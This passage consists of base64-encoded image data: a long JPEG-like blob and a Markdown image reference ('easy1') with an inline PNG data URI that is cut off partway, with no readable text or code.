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



[easy1]:data:image/png;base64,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